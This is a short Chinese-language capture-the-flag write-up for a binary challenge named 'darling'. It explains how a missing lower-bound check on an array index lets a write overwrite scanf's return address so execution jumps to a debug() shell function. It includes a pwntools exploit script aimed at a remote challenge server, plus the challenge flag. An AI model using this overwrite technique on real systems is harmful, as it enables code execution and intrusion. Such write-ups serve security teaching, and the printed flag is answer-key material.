## darling
### solution
首先分析source code，有個`debug()`可以直接執行shell，`main`裏面index部份沒有檢查可能為負數
```c
    scanf("%d", &idx);
    if(idx > 2){
      printf("Error: index error\n");
      continue;
    }

```
因此可以使`index`為-5令`scanf("%lld", &pair[idx]);
`覆蓋到`scanf`本身的return address，寫成`debug`即可。
### script
```python
#!/usr/bin/env python3
from pwn import *
context(arch="amd64")

r = remote("104.199.235.135", 2112)

b = ELF("darling")
r.sendline("-5")
r.sendline(str(b.symbols[b'debug']))

r.interactive()
```
### flag
```
AIS3{r3w3mpeR_t0_CH3cK_b0tH_uPb3r_b0nud_&_10w3r_bounp}
```
